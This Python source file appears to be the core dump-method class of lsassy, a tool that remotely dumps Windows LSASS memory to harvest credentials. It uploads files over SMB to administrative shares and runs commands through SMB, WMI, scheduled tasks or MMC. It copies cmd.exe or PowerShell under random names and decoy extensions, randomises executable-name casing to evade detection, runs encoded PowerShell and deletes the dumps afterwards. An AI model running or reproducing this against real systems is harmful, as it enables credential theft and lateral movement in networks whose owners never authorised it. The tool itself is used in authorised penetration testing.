import base64
import importlib
import os
import random
import string
import time

from lsassy.impacketfile import ImpacketFile
from lsassy.logger import lsassy_logger


class CustomBuffer:
    def __init__(self):
        self._buffer = b""
        self._currentOffset = 0
        self._total_read = 0

    def read(self, size):
        if self._currentOffset >= len(self._buffer):
            return b""
        self._currentOffset += size
        buff = self._buffer[self._currentOffset - size: min(self._currentOffset, len(self._buffer))]
        self._currentOffset = min(self._currentOffset, len(self._buffer))
        return buff

    def write(self, stream):
        self._buffer += stream


class Dependency:
    def __init__(self, name, file=None, content=None):
        self.name = name
        self.file = file
        self.path = False
        self.remote_share = "C$"
        self.remote_path = "\\Windows\\Temp\\"
        self.uploaded = False
        self.content = content
        self.share_mode = False
        

    def get_remote_path(self):
        return self.remote_path + self.file

    def init(self, options):
        if self.content is not None:
            return True
        
        self.path = options.get("{}_path".format(self.name), self.path)

        if not self.path:
            lsassy_logger.error("Missing {}_path".format(self.name))
            return None

        if self.path.startswith('\\\\'):
            # Share provided
            self.remote_path = self.path
            self.file = ""
            self.share_mode = True
            return True
        if not os.path.exists(self.path):
            lsassy_logger.error("{} does not exist.".format(self.path))
            return None

        return True

    def upload(self, session):
        # Upload dependency

        if self.share_mode:
            return True

        if self.content is None:
            lsassy_logger.debug('Copy {} to {}'.format(self.path, self.remote_path))
            with open(self.path, 'rb') as p:
                try:
                    session.smb_session.putFile(self.remote_share, self.remote_path + self.file, p.read)
                    print("{} uploaded".format(self.name))
                    self.uploaded = True
                    return True
                except Exception as e:
                    lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                    return None
        else:
            if not ImpacketFile.create_file(session, self.remote_share, self.remote_path, self.file, self.content):
                lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                return None
            self.uploaded = True
            return True

    def clean(self, session, timeout):
        if self.uploaded:
            ImpacketFile.delete(session, self.remote_path + self.file, timeout=timeout)


class IDumpMethod:

    need_debug_privilege = False
    custom_dump_path_support = True
    custom_dump_name_support = True
    custom_dump_ext_support = True

    dump_name = ""
    dump_ext = ""
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    exec_methods = ("smb", "wmi", "task", "mmc")

    ext = ["csv", "db", "dbf", "log", "sav", "sql", "tar", "xml", "fnt", "fon", "otf", "ttf", "bak", "cfg",
           "cpl", "cur", "dll", "drv", "icns", "ico", "ini", "lnk", "msi", "sys", "tmp", "doc", "docx", "odt",
           "pdf", "rtf", "tex", "txt", "wpd", "png", "jpg", "vhd", "vhdx", "avhd", "avhdx", "vsv", "iso", "rct",
           "vmcx", "vmrs"]

    def __init__(self, session, timeout, time_between_commands, *args, **kwargs):
        self._session = session
        self._file = ImpacketFile(self._session)
        self._file_handle = None
        self._executor_name = ""
        self._executor_path = ""
        self._executor_copied = False
        self._timeout = timeout
        self._time_between_commands = time_between_commands
        

    def get_exec_method(self, exec_method, no_powershell=False):
        try:
            exec_method = importlib.import_module("lsassy.exec.{}".format(exec_method.lower()), "Exec").Exec(self._session)
        except ModuleNotFoundError:
            lsassy_logger.error("Exec module '{}' doesn't exist".format(exec_method.lower()), exc_info=True)
            return None

        if not self.need_debug_privilege or exec_method.debug_privilege:
            return exec_method

        if no_powershell:
            return None

        return exec_method

    def get_commands(self):
        raise NotImplementedError

    def prepare(self, options):
        return True

    def prepare_dependencies(self, options, dependencies):
        if None in (d.init(options) for d in dependencies):
            return None
        if None in (d.upload(self._session) for d in dependencies):
            return None
        return True

    def clean(self):
        return True

    def clean_file(self, remote_path, filename):
        ImpacketFile.delete(self._session, remote_path + filename, timeout=self._timeout)

    def clean_dependencies(self, dependencies):
        [d.clean(self._session, self._timeout) for d in dependencies]

    def exec_method(self):
        return self.need_debug_privilege

    def executor_copy(self, executor):
        executor_locations = {
            'powershell': '\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
            'cmd': '\\Windows\\System32\\cmd.exe'
        }
        if executor not in executor_locations:
            return None

        self._executor_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + "." + random.choice(IDumpMethod.ext)
        self._executor_path = "\\Windows\\Temp\\"
        try:
            lsassy_logger.info("Opening {}".format(executor))
            buff = CustomBuffer()
            self._session.smb_session.getFile("C$", executor_locations[executor], buff.write)
            self._session.smb_session.putFile("C$", self._executor_path + self._executor_name, buff.read)
            print("{} copied as {}".format(executor, self._executor_name))
            self._executor_copied = True
            return True
        except Exception as e:
            lsassy_logger.debug("An error occurred while copying {}".format(executor), exc_info=True)
            self._executor_path = ""
            self._executor_name = executor + ".exe"
            return None

    def executor_clean(self):
        if self._executor_copied:
            ImpacketFile.delete(self._session, self._executor_path + self._executor_name, timeout=self._timeout)
            lsassy_logger.debug("Executor copy deleted")

    def build_exec_command(self, commands, exec_method, no_powershell=False, copy=False):
        lsassy_logger.debug("Building command - Exec Method has seDebugPrivilege: {} | seDebugPrivilege needed: {} | Powershell allowed: {} | Copy executor: {}".format(exec_method.debug_privilege, self.need_debug_privilege, not no_powershell, copy))
        if commands["cmd"] is not None and (not self.need_debug_privilege or exec_method.debug_privilege):
            if not isinstance(commands["cmd"], list):
                commands["cmd"] = [commands["cmd"]]
            self._executor_name = 'cmd.exe'
            if copy:
                self.executor_copy('cmd')
            lsassy_logger.debug(commands["cmd"])
            executor_commands = ["""/Q /c {}""".format(command) for command in commands["cmd"]]
        elif commands["pwsh"] is not None and not no_powershell:
            if not isinstance(commands["pwsh"], list):
                commands["pwsh"] = [commands["pwsh"]]
            self._executor_name = 'powershell.exe'
            if copy:
                self.executor_copy('powershell')
            lsassy_logger.debug(commands["pwsh"])
            executor_commands = ["-NoP -Enc {}".format(base64.b64encode(command.encode('UTF-16LE')).decode("utf-8")) for command in commands["pwsh"]]
        else:
            lsassy_logger.error("Shouldn't fall here. Incompatible constraints")
            return None

        self._executor_name = ''.join(random.choice([str.upper, str.lower])(c) for c in self._executor_name)
        return ["{}{} {}".format(self._executor_path, self._executor_name, command) for command in executor_commands]

    def dump(self, dump_path=None, dump_name=None, no_powershell=False, copy=False, exec_methods=None, **kwargs):
        lsassy_logger.info("Dumping via {}".format(self.__module__))
        if exec_methods is not None:
            self.exec_methods = exec_methods

        if dump_name is not None:
            if not self.custom_dump_name_support:
                lsassy_logger.warning("A custom dump name was provided, but dump method {} doesn't support custom dump name".format(self.__module__))
                lsassy_logger.warning("Dump file will be {}".format(self.dump_name))
            else:
                self.dump_name = dump_name
        elif self.dump_name == "":
            ext = IDumpMethod.ext
            if not self.custom_dump_ext_support:
                ext = [self.dump_ext]
            self.dump_name = "{}.{}".format(
                ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(3,9))),
                random.choice(ext))

        if dump_path is not None:
            if not self.custom_dump_path_support:
                lsassy_logger.warning("A custom dump path was provided, but dump method {} doesn't support custom dump path".format(self.__module__))
                lsassy_logger.warning("Dump path will be {}{}".format(self.dump_share, self.dump_path))
            else:
                self.dump_path = dump_path

        valid_exec_methods = {}
        for e in self.exec_methods:
            exec_method = self.get_exec_method(e, no_powershell)
            lsassy_logger.debug(f"Exec method: {exec_method}")
            if exec_method is not None and exec_method not in valid_exec_methods:
                valid_exec_methods[e] = exec_method
            else:
                lsassy_logger.debug("Exec method '{}' is not compatible".format(e))
        lsassy_logger.debug(f"Exec Methods: {valid_exec_methods}")

        if len(valid_exec_methods) == 0:
            lsassy_logger.error("Current dump constrains cannot be fulfilled")
            lsassy_logger.debug("Dump class: {} (Need SeDebugPrivilege: {})".format(self.__module__, self.need_debug_privilege))
            lsassy_logger.debug("Exec methods: {}".format(self.exec_methods))
            lsassy_logger.debug("Powershell allowed: {}".format("No" if no_powershell else "Yes"))
            return None

        if self.prepare(kwargs) is None:
            lsassy_logger.error("Module prerequisites could not be processed")
            self.clean()
            return None

        try:
            commands = self.get_commands()
        except NotImplementedError:
            lsassy_logger.warning("Module '{}' hasn't implemented all required methods".format(self.__module__))
            return None

        if not isinstance(commands, dict) or "cmd" not in commands or "pwsh" not in commands:
            lsassy_logger.warning("Return value of {} was not expected. Expecting {'cmd':'...', 'pwsh':'...'}")
            return None

        for e, exec_method in valid_exec_methods.items():
            lsassy_logger.info("Trying {} method".format(e))
            exec_commands = self.build_exec_command(commands, exec_method, no_powershell, copy)
            if exec_commands is None:
                # Shouldn't fall there, but if we do, just skip to next execution method
                continue
            try:
                first_execution = True
                for exec_command in exec_commands:
                    if not first_execution:
                        time.sleep(self._time_between_commands)
                    first_execution = False
                    lsassy_logger.debug("Transformed command: {}".format(exec_command))
                    res = exec_method.exec(exec_command)
                    lsassy_logger.debug("Cleaning up connection")
                    exec_method.clean()
                    self.executor_clean()
                self.clean()
            except Exception:
                lsassy_logger.error("Execution method {} has failed".format(exec_method.__module__), exc_info=True)
                continue
            if not res:
                lsassy_logger.error("Failed to dump lsass using {}".format(e))
                continue
            self._file_handle = self._file.open(self.dump_share, self.dump_path, self.dump_name, timeout=self._timeout)
            if self._file_handle is None:
                lsassy_logger.error("Failed to dump lsass using {}".format(e))
                continue
            lsassy_logger.info("Lsass dumped in C:{}{} ({} Bytes)".format(self.dump_path, self.dump_name, self._file_handle.size()))
            return self._file_handle
            
        lsassy_logger.error("All execution methods have failed")
        self.clean()
        return None

    def failsafe(self, timeout=3):
        t = time.time()
        while True:
            if self._file_handle is not None:
                self._file_handle.delete(timeout=timeout)
            else:
                try:
                    self._session.smb_session.deleteFile(self.dump_share, self.dump_path + "/" + self.dump_name)
                    lsassy_logger.debug("Lsass dump deleted")
                except Exception as e:
                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
                        return True
                    if time.time() - t > timeout:
                        lsassy_logger.warning("Lsass dump wasn't removed in {}{}".format(self.dump_share, self.dump_path + "/" + self.dump_name), exc_info=True)
                        return None
                    lsassy_logger.debug("Unable to delete lsass dump file {}{}. Retrying...".format(self.dump_share, self.dump_path + "/" + self.dump_name))
                    time.sleep(0.5)
